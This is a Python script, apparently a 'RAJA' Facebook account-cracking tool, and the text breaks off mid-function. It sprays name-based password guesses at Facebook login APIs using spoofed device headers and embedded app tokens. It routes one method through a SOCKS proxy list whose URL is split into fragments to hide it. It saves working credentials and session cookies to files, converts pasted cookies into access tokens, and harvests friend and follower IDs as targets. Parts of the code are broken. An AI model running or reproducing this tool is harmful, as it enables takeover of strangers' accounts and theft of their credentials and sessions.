#!/usr/bin/python3
#-*-coding:utf-8-*-
import os

try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')

try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
    
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
    
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
os.system("xdg-open https://facebook.com/groups/1281986248984572/")
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
	os.system('python emmy.py')

sys.stdout.write('\x1b]2; RAJA\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
logo = """
\033[1;37m
   d8888b.  .d8b.     d88b  .d8b. 
   88  `8D d8' `8b    `8P' d8' `8b 
   88oobY' 88ooo88     88  88ooo88 
 \033[1;36m  88`8b   88~~~88     88  88~~~88  
 \033[1;31m  88 `88. 88   88 db. 88  88   88 
\033[1;37m   88   YD YP   YP Y8888P  YP   YP   \033[1;32mx ᴅ     
\033[1;37m--------------------------------------------------
[•] AUTHOR     : \033[1;32mM SALMAN \033[1;37m
[•] GITHUB     : \033[1;32mNo_gitHub\033[1;37m 
[•] TOOL TYPE  : \033[1;32mPRO\033[1;37m
[•] STATUS     : \033[1;32mPREMIUM\033[1;37m
--------------------------------------------------
[•] \033[1;37mVERSION    :\033[1;32m 3.1\033[1;37m
[•]\033[1;31m NAAM\033[1;36m  HOGA \033[1;34mTO BADNAM TO \033[1;37mHONGE NA
[•] \033[1;35mWill Update Every 2 Days  
\033[1;37m-------------------------------------------------- """
def clear():
    os.system("clear")
    print(logo)    
    
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print('\n')
        print(47*'-')
        print(' The Process has been Complete...')
        print(' TOTAL OK: %s' % str(len(oks)))
        print(' TOTAL CP: %s' % str(len(cps)))
        print(47*'-')
        input("Press enter to back RAJA Menu ")
        exit()

def RAJA():   
    os.system('clear')
    print(logo)
    print(f'[1] File Crack')
    print(f'[2] Public ID Crack')
    print(f'[3] Random Crack ')
    print(f'[4] Create File')
    print(f'[5] Login Tool')
    print(f'[6] Logout Cookie')
    print(f'[7] Remove Trash Files ')
    print(f'[8] Separate Ids')
    print(f'[9] Remove Duplicate IDs')
    print(f'[C] Contact Owner ')
    print(f'[F] Join Facebook Group ')
    print('')
    select = input('Select Menu>: ')
    if select =='1':
        method_crack()
    elif select =='2':
        exit(' This is Option Soon available ... ')
    elif select =='3':
        random_number()
    elif select =='4':
       menu()
    elif select =='5':
       login()
    elif select =='6':
       remove_Tc()
    elif select =='7':
       removef()
    elif select =='8':
       sids()
    elif select =='9':
       cutter()
    elif select =='C':
        os.system("xdg-open https://www.facebook.com/profile.php?id=100013747051092")
        pass
    elif select =='F':
        os.system('xdg-open https://facebook.com/groups/1281986248984572/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        RAJA(allkey)
        
def method_crack():
    global methods
    clear()
    print(f'[1] Method {1}')
    print(f'[2] Method {2}')
    print(f'[3] Method {3}')
    #print(f'[4] Method {4}')
    print(f'[0] Back')
    print('')
    option = input('Select method>: ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodC')
        main_crack().crack(id)
   # elif option =='4':
    #    methods.append('methodD')
   #     main_crack().crack(id)
    elif option =='0':
        RAJA()
    else:
      print('\n Select Valid Option ...')
      time.sleep(2)
      method_crack()

class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        self.file = input('Put File Name : ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('Opps File Not Found ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('Try Again ...')
            time.sleep(2)
            main_crack().crack(id)
            
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            xoxo = random.choice(colors)
            sys.stdout.write(f"\r{W}[{G}TOP{W}-{G}M1{W}]{G}<{WH}━━{G}>{W}[{xoxo}{loop}{W}]{G}<{WH}━━{G}>{W}[{G}OK{W}-{G}{len(oks)}{W}]{G}<{WH}━━{G}>{W}[{xoxo}{'{:.0%}'.format(loop/float(len(self.id)))}{W}]");sys.stdout.flush()
            fs = __Uid_Name__.split(' ')[0]
            try:ls = __Uid_Name__.split(' ')[1]
            except:ls = fs
            for pw in psw:
                ___Main_Pass___ = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',__Uid_Name__).replace('name',__Uid_Name__.lower())
                with requests.Session() as session:
                    ua = "Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(5,14))+"; "+str(random.choice(mdl))+" Build/QP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+") [FBAN/Orca-Android;FBAV/279.0.0.43.120;FBBV/231020918;FBDM/{density=1.0,width=1600,height=800};FBLC/en_US;FBRV/257325639;FB_FW/2;FBCR/Bell;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.orca;FBDV/E"+"B2"+"101;FBSV/9.7.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                    main_data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","email":___Main_Uid___,"password":___Main_Pass___,"access_token":"256002347743983|374e60f8b9bb6b8cbb30f78030438895","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate"}
                    main_head = {"User-Agent":ua,"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"b-graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True"}
                refat = session.post('https://graph.facebook.com/auth/login',data=main_data,headers=main_head,allow_redirects=False).json()
                if 'session_key' in refat:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in refat["session_cookies"])
                    print(f'\r\r{G}[TOP-OK] {___Main_Uid___} | {___Main_Pass___}      ')
                    #print(f'\r\r\033[38;5;93m[{G}COOKIE\033[38;5;93m]{G} {cookie}\n')
                    open('/sdcard/TOP/TOP-FILE-M1-OK.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n');open('/sdcard/TOP/TOP-FILE-COOKIES-M1.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'|'+cookie+'\n');oks.append(___Main_Uid___)
                    break
                elif 'www.facebook.com' in refat['error']['message']:
                    if 'y' in pcp:
                        print(f'\r\r{W}[TOP-CP] {___Main_Uid___} | {___Main_Pass___}      ')
                    open('/sdcard/TOP/TOP-FILE-CP.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n');cps.append(___Main_Uid___)
                    break
                else:continue
            loop+=1
        except requests.exceptions.ConnectionError:self.methodA(___Main_Uid___, __Uid_Name__, ___Main_Pass___)
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop,twf
            xoxo = random.choice(colors)
            sys.stdout.write(f"\r{W}[{G}TOP{W}-{G}M2{W}]{G}<{WH}━━{G}>{W}[{xoxo}{loop}{W}]{G}<{WH}━━{G}>{W}[{G}OK{W}-{G}{len(oks)}{W}]{G}<{WH}━━{G}>{W}[{xoxo}{'{:.0%}'.format(loop/float(len(self.id)))}{W}]");sys.stdout.flush()
            fs = __Uid_Name__.split(' ')[0]
            try:ls = __Uid_Name__.split(' ')[1]
            except:ls = fs
            for pw in psw:
                ___Main_Pass___ = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',__Uid_Name__).replace('name',__Uid_Name__.lower())
                with requests.Session() as session:
                    ua = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+";[FBAN/FB4A;FBAV/381.0.0.29.105;FBBV/316215288;FBDM/{density=3.0,width=1125,height=1366};FBLC/en_US;FBCR/A1;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vi"+"vo Y"+"9"+"3s;FBSV/13.7.4;FBCA/arm64-v8a:;]"
                    main_data = {"adid": str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"device_based_login","email":___Main_Uid___, "password":___Main_Pass___,"access_token":"350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login", "fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
                    main_head = {"User-Agent":ua,"Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(20000,40000)),"X-FB-SIM-HNI":str(random.randint(20000,40000)),"X-FB-Connection-Type":"MOBILE.LTE","X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":str(random.randint(2000,6000)),"X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
                refat = session.post('https://api.facebook.com/auth/login',data=main_data,headers=main_head,allow_redirects=False).json()
                if 'session_key' in refat:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in refat["session_cookies"])
                    print(f'\r\r{G}[TOP-OK] {___Main_Uid___} | {___Main_Pass___}      ')
                    #print(f'\r\r\033[38;5;93m[{G}COOKIE\033[38;5;93m]{G} {cookie}\n')
                    open('/sdcard/TOP/TOP-FILE-M2-OK.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n');open('/sdcard/TOP/TOP-FILE-COOKIES-M2.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'|'+cookie+'\n');oks.append(___Main_Uid___)
                    break
                elif 'www.facebook.com' in refat['error']['message']:
                    if 'y' in pcp:
                        print(f'\r\r{W}[TOP-CP] {___Main_Uid___} | {___Main_Pass___}      ')
                    open('/sdcard/TOP/TOP-FILE-CP.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n');cps.append(___Main_Uid___)
                    break
                else:continue
            loop+=1
        except requests.exceptions.ConnectionError:self.methodB(___Main_Uid___, __Uid_Name__, ___Main_Pass___)
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            xoxo = random.choice(colors)
            sys.stdout.write(f"\r{W}[{G}TOP{W}-{G}M5{W}]{G}<{WH}━━{G}>{W}[{xoxo}{loop}{W}]{G}<{WH}━━{G}>{W}[{G}OK{W}-{G}{len(oks)}{W}]{G}<{WH}━━{G}>{W}[{xoxo}{'{:.0%}'.format(loop/float(len(self.id)))}{W}]");sys.stdout.flush()
            fs = __Uid_Name__.split(' ')[0]
            try:ls = __Uid_Name__.split(' ')[1]
            except:ls = fs
            for pw in psw:
                ___Main_Pass___ = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',__Uid_Name__).replace('name',__Uid_Name__.lower())
                with requests.Session() as session:
                    ua = "[FBAN/"+"FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+";[FBAN/FB4A;FBAV/163.0.0.36.91;FBBV/96405840;FBDM/{density=1.5,width=1440,height=1366};FBLC/en_US;FBCR/Beeline;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/X"+"Q-AU"+"51;FBSV/10.7.9;FBCA/arm64-v8a:;]"
                    main_data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ___Main_Uid___,"password": ___Main_Pass___,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                    main_head = {'User-Agent': ua,'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                refat = session.post('https://api.facebook.com/auth/login',data=main_data,headers=main_head,allow_redirects=False).json()
                if 'session_key' in refat:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in refat["session_cookies"])
                    print(f'\r\r{G}[TOP-OK] {___Main_Uid___} | {___Main_Pass___}      ')
                    #print(f'\r\r\033[38;5;93m[{G}COOKIE\033[38;5;93m]{G} {cookie}\n')
                    open('/sdcard/TOP/TOP-FILE-M5-OK.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n');open('/sdcard/TOP/TOP-FILE-COOKIES-M5.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'|'+cookie+'\n');oks.append(___Main_Uid___)
                    break
                elif 'www.facebook.com' in refat['error']['message']:
                    if 'y' in pcp:
                        print(f'\r\r{W}[TOP-CP] {___Main_Uid___} | {___Main_Pass___}      ')
                    open('/sdcard/TOP/TOP-FILE-CP.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n');cps.append(___Main_Uid___)
                    break
                else:continue
            loop+=1
        except requests.exceptions.ConnectionError:self.methodE(___Main_Uid___, __Uid_Name__, ___Main_Pass___)
    def methodD(self, sid, name, psw):
        global loop,cps,oks,lim
    try:
        for ___Main_Pass___ in passlist:
            session = requests.Session()
            p=round(loop*100/lim,2)
            xoxo = random.choice(colors)
            sys.stdout.write(f"\r{W}[{G}TOP{W}-{G}R1{W}]{G}<{WH}━━{G}>{W}[{xoxo}{loop}{W}]{G}<{WH}━━{G}>{W}[{G}OK{W}-{G}{len(oks)}{W}]{G}<{WH}━━{G}>{W}[{xoxo}{p}{W}]");sys.stdout.flush()
            rr = random.randint;rc = random.choice
            proxs = requests.get('http'+'s:/'+'/ra'+'w.git'+'hubus'+'ercon'+'tent.com'+'/The'+'Spe'+'edX/'+'SOC'+'KS-'+'List'+'/ma'+'ste'+'r/soc'+'ks4.'+'txt').text
            open('.s'+'ock'+'s'+'ku'+'.tx'+'t','w').write(proxs)
            nip = rc(proxs)
            proxs = {'http': 'so'+'ck'+'s4'+'://'+nip}
            uau = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,13))+"; "+str(random.choice(mdl))+" Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            top_login = session.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=521182029780294&kid_directed_site=0&app_id=521182029780294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D521182029780294%26scope%3Dopenid%2Bemail%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fid.condenast.com%252Finteraction%252Fopenid%252Ffacebook%252Fcomplete%26state%3DS36YbWjHL4HD73w9YA8Jm%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D29764e2e-8dec-4b28-898f-fd3c6fb68dde%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fid.condenast.com%2Finteraction%2Fopenid%2Ffacebook%2Fcomplete%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DS36YbWjHL4HD73w9YA8Jm%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr").text
            ___top_data___ = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(top_login)).group(1),
            'li': re.search('name="li" value="(.*?)"', str(top_login)).group(1),
            'try_number': '0',
            'unrecognized_tries': '0',
            'email': ___Main_Uid___,
            'prefill_contact_point': '',
            'prefill_source': '',
            'prefill_type': '',
            'first_prefill_source': '',
            'first_prefill_type': '',
            'had_cp_prefilled': 'false',
            'had_password_prefilled': 'false',
            'is_smart_lock': 'true',
            'bi_xrwh': '0',
            'pass': ___Main_Pass___,
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(top_login)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(top_login)).group(1),
            '__dyn': '',
            '__csr': '',
            '__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),
            '__a': '',
            '__user': '0',
            '_fb_noscript': 'true'}
            ___top_head___ = {'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': uau,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=521182029780294&kid_directed_site=0&app_id=521182029780294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D521182029780294%26scope%3Dopenid%2Bemail%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fid.condenast.com%252Finteraction%252Fopenid%252Ffacebook%252Fcomplete%26state%3DS36YbWjHL4HD73w9YA8Jm%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D29764e2e-8dec-4b28-898f-fd3c6fb68dde%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fid.condenast.com%2Finteraction%2Fopenid%2Ffacebook%2Fcomplete%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DS36YbWjHL4HD73w9YA8Jm%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
            url = "https://m.facebook.com/login.php?skip_api_login=1&api_key=521182029780294&kid_directed_site=0&app_id=521182029780294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D521182029780294%26scope%3Dopenid%2Bemail%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fid.condenast.com%252Finteraction%252Fopenid%252Ffacebook%252Fcomplete%26state%3DS36YbWjHL4HD73w9YA8Jm%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D29764e2e-8dec-4b28-898f-fd3c6fb68dde%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fid.condenast.com%2Finteraction%2Fopenid%2Ffacebook%2Fcomplete%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DS36YbWjHL4HD73w9YA8Jm%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr"
            lo = session.post(url,data=___top_data___,headers=___top_head___,allow_redirects=False,proxies=proxs).text
            ___Top_Cookies___ = session.cookies.get_dict().keys()
            if 'c_user' in ___Top_Cookies___:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                response = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
                if 'Photoshop' in response:
                    print(f'\r\r{W}[{G}TOP{W}-{G}OK{W}]{G} {uid} {W}|{G} {___Main_Pass___}     ');open('/sdcard/TOP/TOP-RNDM-M2-OK.txt','a').write(uid+'|'+___Main_Pass___+'\n');open('/sdcard/TOP/TOP-RNDM-COOKIES-M2.txt','a').write(uid+'|'+___Main_Pass___+'|'+coki+'\n')
                    print(f'\r\r\033[38;5;93m[{G}COOKIE\033[38;5;93m]{G} {coki}\n')
                    oks.append(uid)
                else:break
            elif 'checkpoint' in ___Top_Cookies___:
                print(f'\r\r{W}[{R}TOP{W}-{R}CP{W}]{R} {___Main_Uid___} {W}|{R} {___Main_Pass___}       ')
                cps.append(___Main_Uid___)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(20)
            
    def pasw(self):       
            pw = []
            clear()
            print('Put limit between 1 to 30')
            sl = int(input('How many password do you want to add?: '))
            os.system("clear")
            print(logo)
            print(f'{S} [Example: first123,last1122,firstlast,last,ETC]')
            print('')
            if sl =='':
                print('\n Put limit between 1 to 30')
            elif sl > 20:
                print('\nPassword limit Should Not Be Greater Than 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'Password {sr+1}: '))
            os.system("clear")
            print(logo)
            
            print(f"\r{A}Use flight (airplane) mode before use {S}")
            print(47*"-")
            print(f'{S} Total IDs : %s ' % len(self.id))
            print(f'{S} Cracking Started...')
            print(47*"-")
            with RAJARAJA(max_workers=30) as RAJAworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                RAJAworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                RAJAworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                RAJAworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                RAJAworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
            

def remove_Tc():
        os.system('rm -rf .token.txt .cookie.txt');print(f'\n{F}Logout Successfully ...')
        login()
        
def login():
    clear()
    print('\x1b[00m\tLogin Using Cookies') 
    try:
        fbcokis= input('\n\x1b[00mPut Cookies:\x1b[92m')
        fact = requests.get("https://adsmanager.facebook.com/adsmanager/", cookies = {"cookie":fbcokis},headers=head).text
        act = re.search("act=(.*?)&nav_source",str(fact)).group(1)
        ftoken = requests.get(f"https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={act}&nav_source=no_referrer", cookies = {"cookie":fbcokis}).text
        eaab = re.search('accessToken="(.*?)"',str(ftoken)).group(1)
        open(".tokn.txt", "w").write(eaab)
        open(".cokis.txt", "w").write(fbcokis)
        token = open('.tokn.txt','r').read()
        info = requests.get('https://graph.facebook.com/me/?access_token='+token,cookies = {"cookie":fbcokis}).json()
        print(f"{R}Login Successfully")
        menu()
    except Exception as error: 
        os.system("rm -f .tokn.txt")
        print("\x1b[1;91m\n\t\t[!] Cookies Expired ")
        slp(2)
        login()

def public():
    fbidz = []
    clear()
    print(logo)
    global totaldmp,count,srange 
    try:
        fbcokis = open(".cokis.txt", "r").read()
        token = open('.tokn.txt','r').read()
    except FileNotFoundError:
        print(f"{A}Cookie Expired ")
        slp(1)
        cmd('rm -rf .token.txt .cokis.txt')
        login()
    try:
        clear()
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        for rept in range(srange):
            rept += 1
            fbuid = input("[" + str(rept) + "] Put id username: ")
            clear()
            if  fbuid=='stop':
                break
                ys.close()
            try:
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    totaldmp+=1
                    fbidz.append(idnm['id'])
            except KeyError:
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/RAJA.txt') 
        print(47*"-")
        filepath = input("Put File Name: ")
        os.system('rm -rf %s'%(filepath))
        clear()
        apnd = open(filepath,'w')
        for fbuid in fbidz:
            count += 1
            try:
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    apnd.write(idnm['id']+"|"+idnm['name']+'\n')
                pass
                fx = (str(len(open(filepath,'r').readlines())))
                sys.stdout.write(f"\r\r{S}Collection IDs = [{fx}]{S}");sys.stdout.flush()
            except KeyError:
                pass
        apnd.close()
        print('')
        print(47*"-")
        print (f"Total IDs: {(str(len(open(filepath,'r').readlines())))}")
        print(47*"-")
        print (f"File Saved To : {filepath} ")
        print(47*"-")
        input("Press Enter To Back Menu ")
        menu()
    except Exception as e:
        exit("[*] Error : %s"%e)
        
def follower():
    fbidz = []
    clear()
    global totaldmp,count
    try:
        fbcokis = open(".cokis.txt", "r").read()
        token = open('.tokn.txt','r').read()
    except FileNotFoundError:
        print(f"{A}Cookie Expired ")
        slp(1)
        cmd('rm -rf .tokn.txt .cokis.txt')
        login()
    try:
        clear()
        try:
            fbbuid = input("Put Id Username: ")
            clear()
            dmp = requests.get("https://graph.facebook.com/"+fbbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
            for idnm in dmp['friends']['data']:
                totaldmp+=1
                fbidz.append(idnm['id'])
        except KeyError:
            print(f"{A}ID Not Public");time.sleep(1)
            menu()
        print(f'File Name To Dump Ids. Example /sdcard/RAJA.txt') 
        print(47*"-")
        filepath = input("Put File Name: ")
        os.system('rm -rf %s'%(filepath))
        clear()
        apnd = open(filepath,'w')
        for fbuid in fbidz:
            count += 1
            try:
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"?fields=subscribers.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['subscribers']['data']:
                    apnd.write(idnm['id']+"|"+idnm['name']+'\n')
                pass
                fx = (str(len(open(filepath,'r').readlines())))
                sys.stdout.write(f"\r\r{S}Collection IDs = [{fx}]{S}");sys.stdout.flush()
            except KeyError:
                pass
        apnd.close()
        print('')
        print(47*"-")
        print (f"Total IDs: {(str(len(open(filepath,'r').readlines())))}")
        print(47*"-")
        print (f"File Saved To : {filepath} ")
        print(47*"-")
        input("Press Enter To Back Menu ")
        menu()
    except Exception as e:
        exit("[*] Error : %s"%e)

def sids():
    os.system('clear')
    print(logo)
    try:
        file_name = input('Put File Name: ')
        open(file_name,'r').read()
    except FileNotFoundError:
        print(' File not found.')
        exit()
    clear()
    print('\033[1;37mPut limit between 1 to 10 \033[0;97m')
    limit = int(input('How many links do you want to separate?: '))
    clear()
    print('\033[1;37mExample: /sdcard/RAJA.txt\033[0;97m')
    print(47*'-')
    new_save = input('Save new file as: ')
    clear()
    print('\033[1;37mExample: 10008,10007,10006')
    print(47*'-')
    y = 0
    for k in range(limit):
        y+=1
        links = input('Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(47*'-')
    print('Links grabbed successfully')
    print('Total grabbed links: '+str(len(open(new_save).read().splitlines())))
    print('New file saved as: '+new_save)
    print(47*'-')
    input('Press enter to back Menu ')
    menu()
    
def cutter():
    os.system('clear')
    print(logo)
    print("Enter File Path / File Location \n")
    RAJA = input('Put File Name :')
    print(" ")
    RAJA = input('Saving Put File Name :')
    os.system('touch ' +RAJA)
    os.system('sort -r '+RAJA+' | uniq > '+RAJA)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + RAJA )
    print(47*'-')
    print("File Saved To :" + RAJA )
    print(47*'-')
    input(f"{S} Press Enter To Back RAJA Menu ")
    menu
       

#------[ MAIN MENU ]--------->>
def menu():
    clear()
    try:
